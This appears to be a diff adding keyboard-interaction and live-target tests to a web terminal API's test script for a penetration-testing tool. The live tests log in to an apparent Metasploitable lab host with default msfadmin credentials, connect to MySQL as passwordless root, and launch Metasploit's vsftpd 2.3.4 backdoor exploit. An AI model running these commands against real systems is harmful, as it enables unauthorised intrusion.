@@ -615,6 +615,338 @@ test("T5.4: delete removes terminal session from snapshot", test_t5_delete_remov
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+print("\n" + "="*60)
+print("T6: Keyboard interaction via terminal input API")
+print("="*60 + "\n")
+
+def _start_session(label='kb-test'):
+    """Helper: start a terminal session and wait for bash prompt."""
+    r = client.post('/api/terminal/start', json={'label': label, 'host_ip': '10.99.99.1'})
+    sid = r.get_json().get('session_id')
+    if not sid:
+        return None, "start failed"
+    # Wait for bash prompt
+    for _ in range(30):
+        time.sleep(0.1)
+        out = client.get(f'/api/terminal/{sid}/output?offset=0').get_json().get('data', '')
+        if '$' in out or '#' in out:
+            return sid, None
+    return sid, "bash prompt not seen"
+
+def _send(sid, data):
+    """Helper: send data to terminal stdin."""
+    return client.post(f'/api/terminal/{sid}/input', json={'data': data})
+
+def _read(sid, offset=0, timeout=3):
+    """Helper: read output until timeout, return accumulated text."""
+    output = ''
+    deadline = time.time() + timeout
+    last_offset = offset
+    while time.time() < deadline:
+        r = client.get(f'/api/terminal/{sid}/output?offset={last_offset}')
+        if r.status_code == 200:
+            d = r.get_json()
+            output += d.get('data', '')
+            last_offset = d.get('next_offset', last_offset)
+        time.sleep(0.1)
+    return output
+
+def test_t6_tab_completion():
+    """Tab key (\t) must trigger bash tab completion."""
+    sid, err = _start_session('tab-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    # Get current offset to only read new output
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Send partial path + Tab
+    _send(sid, 'ls /us\t')
+    output = _read(sid, offset=offset, timeout=2)
+    # Tab completion should expand /us to /usr or show /usr/ or list usr contents
+    return ok('/usr' in output or 'usr' in output.lower(),
+              f"Tab completion not triggered. Got: {output[:200]!r}")
+test("T6.1: Tab key triggers bash tab completion", test_t6_tab_completion)
+
+def test_t6_arrow_up_history():
+    """Up arrow (\x1b[A) must recall previous command from bash history."""
+    sid, err = _start_session('history-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    # Run a distinctive command
+    _send(sid, 'echo HISTORY_MARKER_99\n')
+    time.sleep(0.5)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Press Up arrow to recall it
+    _send(sid, '\x1b[A')
+    output = _read(sid, offset=offset, timeout=2)
+    return ok('HISTORY_MARKER_99' in output or 'echo HISTORY_MARKER_99' in output,
+              f"Arrow-up history not working. Got: {output[:200]!r}")
+test("T6.2: Up arrow recalls previous command from bash history", test_t6_arrow_up_history)
+
+def test_t6_ctrl_c_interrupts():
+    """Ctrl+C (\x03) must interrupt a running command and return prompt."""
+    sid, err = _start_session('ctrlc-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    # Start a long-running command
+    _send(sid, 'sleep 60\n')
+    time.sleep(0.5)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Send Ctrl+C
+    _send(sid, '\x03')
+    output = _read(sid, offset=offset, timeout=3)
+    # Should see ^C and a new prompt
+    return ok('^C' in output or 'Interrupt' in output or '$' in output or '#' in output,
+              f"Ctrl+C did not interrupt. Got: {output[:200]!r}")
+test("T6.3: Ctrl+C interrupts a running command", test_t6_ctrl_c_interrupts)
+
+def test_t6_ctrl_d_exits_subshell():
+    """Ctrl+D (\x04) in a subshell must exit it and return to parent."""
+    sid, err = _start_session('ctrld-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    # Start a subshell
+    _send(sid, 'bash\n')
+    time.sleep(0.5)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Exit with Ctrl+D
+    _send(sid, '\x04')
+    output = _read(sid, offset=offset, timeout=2)
+    # Should see exit indication or a new prompt
+    return ok('exit' in output.lower() or '$' in output or '#' in output,
+              f"Ctrl+D did not exit subshell. Got: {output[:200]!r}")
+test("T6.4: Ctrl+D exits a subshell", test_t6_ctrl_d_exits_subshell)
+
+def test_t6_resize_updates_terminal_dimensions():
+    """After resize, stty size must report the new dimensions."""
+    sid, err = _start_session('resize-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    # Send a distinctive resize
+    client.post(f'/api/terminal/{sid}/resize', json={'rows': 30, 'cols': 120})
+    time.sleep(0.3)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Query terminal dimensions
+    _send(sid, 'stty size\n')
+    output = _read(sid, offset=offset, timeout=2)
+    return ok('30' in output and '120' in output,
+              f"resize dimensions not reflected by stty size. Got: {output[:200]!r}")
+test("T6.5: resize updates terminal dimensions (stty size)", test_t6_resize_updates_terminal_dimensions)
+
+def test_t6_ctrl_l_clears_screen():
+    """Ctrl+L (\x0c) must send clear-screen to bash."""
+    sid, err = _start_session('ctrll-test')
+    if err: return f"SKIP: {err}"
+    time.sleep(0.3)
+    _send(sid, 'echo BEFORE_CLEAR\n')
+    time.sleep(0.3)
+    # Ctrl+L — bash sends a clear escape sequence
+    _send(sid, '\x0c')
+    time.sleep(0.3)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    # Output should contain a clear sequence (ESC[2J or ESC[H) or just not crash
+    out = r.get_json().get('data', '')
+    return ok(r.status_code == 200 and len(out) > 0,
+              "Ctrl+L caused session failure")
+test("T6.6: Ctrl+L sends clear-screen sequence", test_t6_ctrl_l_clears_screen)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+print("\n" + "="*60)
+print("T7: Live terminal tests (requires LEGION_TEST_TARGET)")
+print("="*60 + "\n")
+
+_LIVE_TARGET = os.environ.get('LEGION_TEST_TARGET', '').strip()
+
+def _live_start(command, label):
+    """Start a terminal session with a command against the live target."""
+    r = client.post('/api/terminal/start', json={
+        'label': label,
+        'host_ip': _LIVE_TARGET,
+        'command': command,
+    })
+    return r.get_json().get('session_id')
+
+def _live_wait_for(sid, pattern, timeout=60, send_after_prompt=None):
+    """Poll output until pattern appears. Returns output seen or None on timeout."""
+    import time as _t
+    deadline = _t.time() + timeout
+    offset = 0
+    accumulated = ''
+    while _t.time() < deadline:
+        _t.sleep(0.2)
+        r = client.get(f'/api/terminal/{sid}/output?offset={offset}')
+        if r.status_code != 200:
+            break
+        d = r.get_json()
+        chunk = d.get('data', '')
+        accumulated += chunk
+        offset = d.get('next_offset', offset)
+        if pattern.lower() in accumulated.lower():
+            if send_after_prompt:
+                client.post(f'/api/terminal/{sid}/input',
+                           json={'data': send_after_prompt})
+            return accumulated
+    return None
+
+def test_t7_ssh_connects_and_authenticates():
+    """SSH to live target with msfadmin:msfadmin credentials → shell prompt."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = (f"ssh msfadmin@{_LIVE_TARGET}"
+           f" -oHostKeyAlgorithms=+ssh-rsa"
+           f" -oPubkeyAcceptedAlgorithms=+ssh-rsa"
+           f" -oStrictHostKeyChecking=no")
+    sid = _live_start(cmd, 'ssh-live-test')
+    if not sid:
+        return "FAIL: could not start terminal session"
+    # Wait for password prompt, then send password
+    out = _live_wait_for(sid, 'password', timeout=15,
+                         send_after_prompt='msfadmin\n')
+    if not out:
+        return "FAIL: no password prompt seen"
+    # Wait for shell prompt after authentication
+    out2 = _live_wait_for(sid, 'msfadmin@', timeout=10)
+    if not out2:
+        out2 = _live_wait_for(sid, '$', timeout=5)
+    return ok(out2 is not None,
+              f"No shell prompt after SSH login. Output: {(out+out2 if out2 else out)[-300:]!r}")
+test("T7.1: SSH connects and authenticates (msfadmin@metasploitable)", test_t7_ssh_connects_and_authenticates)
+
+def test_t7_ssh_command_execution():
+    """After SSH login, run whoami → confirms interactive shell works."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = (f"ssh msfadmin@{_LIVE_TARGET}"
+           f" -oHostKeyAlgorithms=+ssh-rsa"
+           f" -oPubkeyAcceptedAlgorithms=+ssh-rsa"
+           f" -oStrictHostKeyChecking=no")
+    sid = _live_start(cmd, 'ssh-whoami-test')
+    if not sid:
+        return "FAIL"
+    # Authenticate
+    out = _live_wait_for(sid, 'password', timeout=15,
+                         send_after_prompt='msfadmin\n')
+    if not out:
+        return "SKIP: no password prompt"
+    _live_wait_for(sid, '$', timeout=10)
+    # Run whoami
+    import time as _t; _t.sleep(0.3)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    client.post(f'/api/terminal/{sid}/input', json={'data': 'whoami\n'})
+    out2 = _live_wait_for(sid, 'msfadmin', timeout=10)
+    return ok(out2 is not None and 'msfadmin' in out2,
+              f"whoami did not return 'msfadmin'. Got: {str(out2)[-200:] if out2 else 'None'}")
+test("T7.2: SSH shell executes whoami → returns msfadmin", test_t7_ssh_command_execution)
+
+def test_t7_mysql_connects():
+    """mysql -u root connects to live target → mysql prompt appears."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    # Explicit port 3306; Metasploitable may show 'mysql>' or 'MariaDB' or welcome text
+    cmd = f"mysql -u root -h {_LIVE_TARGET} -P 3306"
+    sid = _live_start(cmd, 'mysql-live-test')
+    if not sid:
+        return "FAIL: could not start terminal session"
+    # Look for any mysql/mariadb indicator
+    out = _live_wait_for(sid, 'mysql', timeout=30)
+    if not out:
+        out = _live_wait_for(sid, 'MariaDB', timeout=10)
+    return ok(out is not None,
+              f"No mysql/MariaDB prompt. Output: {str(out)[-300:] if out else 'None'}")
+test("T7.3: MySQL connects with root (no password) → mysql prompt", test_t7_mysql_connects)
+
+def test_t7_mysql_query_executes():
+    """After mysql connects, SELECT VERSION() returns a version string."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = f"mysql -u root -h {_LIVE_TARGET} -P 3306"
+    sid = _live_start(cmd, 'mysql-query-test')
+    if not sid:
+        return "FAIL"
+    # Wait for any mysql prompt
+    out = _live_wait_for(sid, 'mysql', timeout=30)
+    if not out:
+        out = _live_wait_for(sid, 'MariaDB', timeout=10)
+    if not out:
+        return "SKIP: no mysql prompt seen"
+    import time as _t; _t.sleep(0.5)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    client.post(f'/api/terminal/{sid}/input', json={'data': 'SELECT VERSION();\n'})
+    out2 = _live_wait_for(sid, '.', timeout=15)  # version strings always contain dots
+    return ok(out2 is not None and any(c.isdigit() for c in out2),
+              f"SELECT VERSION() no version string. Got: {str(out2)[-200:] if out2 else 'None'}")
+test("T7.4: MySQL SELECT VERSION() returns version string", test_t7_mysql_query_executes)
+
+def test_t7_msfconsole_starts_and_shows_prompt():
+    """msfconsole starts and shows msf6 > prompt after vsftpd exploit setup."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = (f"msfconsole -q -x "
+           f"'use exploit/unix/ftp/vsftpd_234_backdoor; "
+           f"setg RHOSTS {_LIVE_TARGET}; run -j;'")
+    sid = _live_start(cmd, 'msf-live-test')
+    if not sid:
+        return "FAIL: could not start terminal session"
+    # msfconsole takes 30-60s to start, load modules, and run
+    out = _live_wait_for(sid, 'msf6', timeout=120)
+    return ok(out is not None,
+              f"msf6 > prompt not seen within 120s. Output: {str(out)[-300:] if out else 'None'}")
+test("T7.5: msfconsole starts and shows msf6 prompt", test_t7_msfconsole_starts_and_shows_prompt)
+
+def test_t7_msfconsole_exploit_runs():
+    """vsftpd exploit runs (run -j) and shows exploit status in output."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = (f"msfconsole -q -x "
+           f"'use exploit/unix/ftp/vsftpd_234_backdoor; "
+           f"setg RHOSTS {_LIVE_TARGET}; run -j;'")
+    sid = _live_start(cmd, 'msf-exploit-test')
+    if not sid:
+        return "FAIL"
+    # Wait for msf6 prompt (means module loaded and exploit attempted)
+    out = _live_wait_for(sid, 'msf6', timeout=120)
+    if not out:
+        return "SKIP: msf6 prompt not seen"
+    # Look for exploit output: session opened, exploit completed, or backdoor found
+    exploit_indicators = ['session', 'shell', 'exploit', 'backdoor', 'uid=']
+    found = any(ind.lower() in out.lower() for ind in exploit_indicators)
+    return ok(found,
+              f"No exploit indicator in output. Got: {out[-400:]!r}")
+test("T7.6: vsftpd exploit runs and shows session/exploit output", test_t7_msfconsole_exploit_runs)
+
+def test_t7_msfconsole_sessions_command():
+    """After exploit, typing sessions shows session listing."""
+    if not _LIVE_TARGET:
+        return "SKIP"
+    cmd = (f"msfconsole -q -x "
+           f"'use exploit/unix/ftp/vsftpd_234_backdoor; "
+           f"setg RHOSTS {_LIVE_TARGET}; run -j;'")
+    sid = _live_start(cmd, 'msf-sessions-test')
+    if not sid:
+        return "FAIL"
+    # Wait for msf6 prompt
+    out = _live_wait_for(sid, 'msf6', timeout=120)
+    if not out:
+        return "SKIP: msf6 prompt not seen"
+    import time as _t; _t.sleep(1)
+    r = client.get(f'/api/terminal/{sid}/output?offset=0')
+    offset = r.get_json().get('next_offset', 0)
+    # Send sessions command
+    client.post(f'/api/terminal/{sid}/input', json={'data': 'sessions\n'})
+    out2 = _live_wait_for(sid, 'session', timeout=15)
+    return ok(out2 is not None,
+              f"sessions command gave no output. Got: {str(out2)[-300:] if out2 else 'None'}")
+test("T7.7: msfconsole sessions command shows session listing", test_t7_msfconsole_sessions_command)
+
+
 total = PASS + FAIL + SKIP
 print(f"\n{'='*60}")
 print(f"Results: {PASS} passed, {FAIL} failed, {SKIP} skipped out of {total}")
